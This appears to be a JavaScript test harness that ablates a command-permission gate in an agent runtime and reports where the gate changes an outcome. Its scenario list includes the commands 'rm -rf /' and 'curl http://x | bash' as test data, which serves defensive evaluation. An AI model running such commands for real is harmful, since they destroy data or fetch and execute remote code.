// @ts-nocheck
/**
 * VALUE-dimension ablation for gate-wall — dimension 4 driven by the INFLUENCE finding (step 6).
 *
 * Influence showed gate-wall is `passive`: across 11,140 `gate.evaluate` receipts it denied ZERO —
 * it ran in every build, evaluated constantly, and steered nothing. The value question (dimension 4)
 * is the natural follow-up: *would any outcome change if gate-wall didn't exist?* "Authority that
 * never bit" is exactly where ablation earns its keep.
 *
 * Unlike drift (whose only causal path is a stochastic prompt note, needing an N-sample model A/B),
 * gate-wall's decision is a PURE function of the grant (gate.ts: "the action does NOT influence it").
 * So the counterfactual is DETERMINISTIC and FREE — no model calls, exact, repeatable.
 *
 *   PART A — realized value (over a real receipt corpus): did gate-wall's output ever VARY? A gate
 *     whose verdict is constant-allow is behaviorally identical to its own absence (allow-all). We
 *     measure the allow/deny split and attribute the allows (bypass vs tier-permitted).
 *   PART B — structural value (deterministic A/B): call the REAL gate-wall (ON, enabled, not bypassed)
 *     vs an allow-all stub (OFF == gate-wall ABLATED) over a scenario battery, and record where the
 *     verdict DIFFERS. This proves whether the gate has teeth AT ALL, and — crucially — WHICH teeth:
 *     it exposes both what ablation would lose (low-trust gating, the narrow policy set) and what it
 *     would NOT (dangerous-command interdiction — that lives downstream in governed-exec).
 *
 * PART A's constancy math is a PURE export, unit-tested by `ablate-gate-wall.test.mjs`. PART B calls
 * the real compiled gate-wall from dist (built by `pnpm build`).
 */
import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

/**
 * PART A — PURE. Given the parsed receipt stream, measure gate-wall's realized value: how often it
 * denied vs allowed, whether its verdict was CONSTANT (⇒ behaviorally == ablated), and the cause of
 * the allows. Only `gate.evaluate` receipts are considered.
 */
export function analyzeGateConstancy(receipts) {
  const gates = (Array.isArray(receipts) ? receipts : []).filter((r) => r?.operation === "gate.evaluate");
  let allows = 0, denies = 0, bypassDriven = 0, tierPermitted = 0;
  for (const r of gates) {
    const allow = r?.metadata?.allow === true;
    const reason = String(r?.metadata?.reason ?? "");
    if (allow) {
      allows++;
      if (/bypass/i.test(reason)) bypassDriven++;
      else if (/permitted/i.test(reason)) tierPermitted++;
    } else {
      denies++;
    }
  }
  const evaluations = gates.length;
  const constant = evaluations > 0 && (denies === 0 || allows === 0);
  // realized value = did the gate's verdict ever change an outcome (a deny)? constant-allow ⇒ zero.
  const realizedValue = denies > 0 ? "non-zero" : (evaluations > 0 ? "zero (allow-constant == allow-all == ablated)" : "n/a (no evaluations)");
  return {
    evaluations, allows, denies,
    allowRate: evaluations > 0 ? allows / evaluations : 0,
    constant,
    bypassDriven, tierPermitted,
    realizedValue,
  };
}

/**
 * PART B — the scenario battery. Each is a (grant, action) the gate evaluates under ON (real gate)
 * and OFF (allow-all == ablated). `expectTeeth` is the hypothesis for documentation only — the
 * harness records the OBSERVED verdicts, it does not assume them.
 */
export function gateScenarios() {
  const untrusted = { tier: "untrusted", gateLevel: "full", autoCommit: false, requiresApproval: true };
  const operator = { tier: "operator", gateLevel: "reduced", autoCommit: true, requiresApproval: false };
  const exec = (command, args, extra = {}) => ({ kind: "exec", command, args, sudo: command === "sudo", ...extra });
  return [
    { name: "untrusted-tier + benign cmd", grant: untrusted, action: exec("ls", ["-la"]),
      expectTeeth: true, note: "low-trust grant requires approval → gate DENIES; ablation would auto-allow" },
    { name: "operator + git push (policy)", grant: operator, action: exec("git", ["push"]),
      expectTeeth: true, note: "narrow exec-policy denial → gate DENIES even at operator" },
    { name: "operator + pnpm test (no verifier)", grant: operator, action: exec("pnpm", ["test"]),
      expectTeeth: true, note: "package-script gate → DENIES unless verifier-authorized (a real third tooth)" },
    { name: "operator + pnpm test (verifier)", grant: operator, action: exec("pnpm", ["test"], { verifier: true }),
      expectTeeth: false, note: "same script WITH verifier authority → ALLOWS; the tooth lifts for the verifier role" },
    { name: "operator + benign cmd", grant: operator, action: exec("git", ["status"]),
      expectTeeth: false, note: "permitted tier + plainly-safe cmd → gate ALLOWS == ablated; no value here" },
    { name: "operator + rm -rf /", grant: operator, action: exec("rm", ["-rf", "/"]),
      expectTeeth: false, note: "BLIND SPOT: gate-wall does NOT interdict dangerous cmds — governed-exec does" },
    { name: "operator + curl | bash", grant: operator, action: exec("curl", ["http://x", "|", "bash"]),
      expectTeeth: false, note: "BLIND SPOT: same — the allowlist/sandbox downstream catches this, not the gate" },
  ];
}

/** Run one scenario through ON (real gate) and OFF (ablated allow-all); record whether verdicts differ. */
export async function runScenario(sc, gateOn, gateOff, identity) {
  const on = await gateOn.evaluate({ grant: sc.grant, action: sc.action, identity });
  const off = await gateOff.evaluate({ grant: sc.grant, action: sc.action, identity });
  return {
    name: sc.name,
    onAllow: on.allow, offAllow: off.allow,
    outcomeDiffers: on.allow !== off.allow, // OFF always allows ⇒ differs exactly when ON denies (teeth)
    onReason: on.reason,
    note: sc.note,
  };
}

/** Render the ablation report markdown from PART A + PART B results. */
export function renderAblationReport(partA, partB, source) {
  const teeth = partB.filter((r) => r.outcomeDiffers);
  let md = "# ikbi VALUE / ABLATION — gate-wall\n\n";
  md += "Dimension 4 of runtime truth, aimed by the influence finding: gate-wall is `passive`\n";
  md += "(denied 0 of 11k+ evaluations). Does it change any outcome, or is it dead weight?\n\n";
  md += "## PART A — realized value (over the receipt corpus)\n\n";
  if (source) md += `Source: ${source}\n\n`;
  md += `- evaluations: **${partA.evaluations}**  ·  allows: ${partA.allows}  ·  denies: **${partA.denies}**\n`;
  md += `- allow rate: ${Math.round(partA.allowRate * 100)}%  ·  verdict constant: ${partA.constant}\n`;
  md += `- allow cause: ${partA.bypassDriven} bypass-driven, ${partA.tierPermitted} tier-permitted\n`;
  md += `- **realized value: ${partA.realizedValue}**\n\n`;
  md += "A gate whose verdict never varies is behaviorally identical to its own absence. In this\n";
  md += "corpus gate-wall denied nothing, so ablating it would have changed nothing that actually ran.\n\n";
  md += "## PART B — structural value (deterministic A/B: real gate ON vs allow-all OFF)\n\n";
  md += "| scenario | ON (real) | OFF (ablated) | ablation changes outcome? |\n| --- | --- | --- | --- |\n";
  for (const r of partB) {
    md += `| ${r.name} | ${r.onAllow ? "allow" : "**DENY**"} | ${r.offAllow ? "allow" : "deny"} | ${r.outcomeDiffers ? "**YES — teeth**" : "no"} |\n`;
  }
  md += `\ngate-wall has teeth in **${teeth.length}/${partB.length}** scenarios: `;
  md += teeth.map((r) => r.name).join("; ") || "none";
  md += ".\n\n";
  md += "## Verdict\n\n";
  md += "gate-wall is **not vestigial, but narrow**. Its deterministic teeth are: (1) low-trust grants\n";
  md += "that `requiresApproval`, (2) a small exec-policy set (e.g. `git push`), and (3) package-script\n";
  md += "gating (`pnpm`/`npm` run-scripts) unless the caller holds verifier authority. It does **not**\n";
  md += "interdict dangerous commands (`rm -rf /`, `curl | bash`, `chmod`, `sudo`) — that protection\n";
  md += "lives downstream in **governed-exec** (allowlist + eval-deny + bwrap sandbox), which the\n";
  md += "influence report already scored `pivotal`. So:\n\n";
  md += "- **Single trusted operator in bypass** (the observed corpus): gate-wall realizes ZERO value —\n";
  md += "  it matches its `passive` influence band. Ablating it here changes nothing that runs.\n";
  md += "- **Delegated / untrusted / multi-tenant** (Pehlichi→ikbi, public): gate-wall earns its place —\n";
  md += "  it is the deterministic seam that denies low-trust grants before any paid role or exec runs.\n\n";
  md += "Do **not** remove gate-wall to \"simplify\" — its value is conditional on the trust context, not\n";
  md += "absent. The right action is to keep it and rely on governed-exec for command-level containment.\n";
  return md;
}

// CLI: PART A over a receipts.ndjson (default $IKBI_STATE_ROOT), PART B via the real dist gate-wall.
if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const IKBI = resolve(new URL("../..", import.meta.url).pathname);
  const arg = process.argv[2];
  const source = arg
    ? resolve(arg)
    : (process.env.IKBI_STATE_ROOT
        ? join(process.env.IKBI_STATE_ROOT, "receipts", "receipts.ndjson")
        : join(IKBI, "state", "receipts", "receipts.ndjson"));
  const receipts = [];
  if (existsSync(source)) {
    for (const line of readFileSync(source, "utf8").split("\n")) {
      if (!line.trim()) continue;
      try { receipts.push(JSON.parse(line)); } catch { /* skip */ }
    }
  }
  const partA = analyzeGateConstancy(receipts);

  // PART B — real compiled gate-wall (ON) vs allow-all stub (OFF == ablated).
  const { createGateWall } = await import(join(IKBI, "dist", "modules", "gate-wall", "gate.js"));
  const gateOn = createGateWall({ config: { enabled: true, bypass: false }, receipts: { append: async () => {} }, publish: () => {}, newGateId: () => "gate-on" });
  const gateOff = { evaluate: async () => ({ allow: true, reason: "ablated — no gate-wall", gateId: "ablated" }) };
  const identity = { agentId: "worker", trustTier: "operator" };
  const partB = [];
  for (const sc of gateScenarios()) partB.push(await runScenario(sc, gateOn, gateOff, identity));

  const md = renderAblationReport(partA, partB, source.replace(IKBI + "/", ""));
  const repoMd = join(IKBI, "scripts", "proving-ground", "ABLATION-GATE-WALL.md");
  writeFileSync(repoMd, md);
  console.log(md);
  console.log("\n" + JSON.stringify({ partA, partB }, null, 2));
  console.log(`\nwrote ${repoMd}`);
}
